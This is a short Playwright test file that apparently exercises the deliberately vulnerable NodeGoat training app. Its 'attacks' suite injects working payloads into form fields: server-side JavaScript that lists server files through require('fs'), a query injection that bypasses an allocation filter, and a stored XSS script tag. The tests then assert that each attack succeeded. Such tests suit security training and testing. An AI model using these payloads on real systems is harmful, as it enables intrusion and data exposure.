import { test, expect } from '@playwright/test';

test.use({ storageState: './tmp/admin.json' })
test.describe('attacks', () => {
  test('contributions', async ({ page }) => {
    await page.goto('/contributions');

    await page.locator('input[name=preTax]').fill('res.end(require(\'fs\').readdirSync(\'.\').toString())');
    await page.locator('form button[type=submit]').click();

    await expect(page.locator("text=CODE_OF_CONDUCT.md")).toHaveCount(1)
  })

  test('allocations', async ({ page }) => {
    await page.goto('/allocations/3');

    await page.locator('input[name=threshold]').fill('1\'; return \'1\' == \'1');
    await page.locator('form button[type=submit]').click();

    await expect(page.locator("text=Asset Allocations for Node Goat Admin")).toHaveCount(1)
  })

  test('profile', async ({ page }) => {
    await page.goto('/profile');

    await page.locator('input#firstName').fill('<script>document.title=\'XSS\'</script>');
    await page.locator('input#bankRouting').fill('0198212#');

    await page.locator('form button[type=submit]').click();

    await expect(page.locator("text=Profile updated successfully.")).toHaveCount(1);
  })
});